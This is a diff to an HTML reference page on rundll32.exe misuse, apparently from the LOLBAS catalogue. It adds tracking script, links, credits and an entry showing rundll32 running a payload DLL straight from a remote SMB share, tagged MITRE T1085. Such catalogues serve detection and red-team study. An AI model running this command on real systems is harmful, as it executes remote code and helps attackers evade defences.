@@ -44,6 +44,14 @@
 <p>Used by Windows to execute dll files</p>
 
 
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-133649096-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-133649096-1');
+</script>
 
 <br>
 <p><b>Paths:</b> 
@@ -73,6 +81,12 @@
 	
 	<a href="https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/">https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/</a>
 	<br>
+	
+	<a href="https://github.com/sailay1996/expl-bin/blob/master/obfus.md">https://github.com/sailay1996/expl-bin/blob/master/obfus.md</a>
+	<br>
+	
+	<a href="https://github.com/sailay1996/misc-bin/blob/master/rundll32.md">https://github.com/sailay1996/misc-bin/blob/master/rundll32.md</a>
+	<br>
 	 
 <br>
 <p><b>Acknowledgement:</b> 
@@ -85,6 +99,12 @@
 	<br>
 	
 	Jimmy - <a href="https://twitter.com/@bohops">@bohops</a>
+	<br>
+	
+	Sailay - <a href="https://twitter.com/@404death">@404death</a>
+	<br>
+	
+	Martin Ingesen - <a href="https://twitter.com/@Mrtn9">@Mrtn9</a>
 	<br>
 	 
 </p>
@@ -114,6 +134,21 @@
 		OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
 		<br>
 		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1085">T1085</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
+		Use Rundll32.exe to execute a DLL from a SMB share. EntryPoint is the name of the entry point in the .DLL file to execute.
+		<br>
+		<pre><code>rundll32.exe \\10.10.10.10\share\payload.dll,EntryPoint</code></pre>
+		Usecase:Execute DLL from SMB share.
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+		<br>
+		Mitre:<a href="https://attack.mitre.org/techniques/T1085">T1085</a>
 		<br>
 		<br>
 		<br>
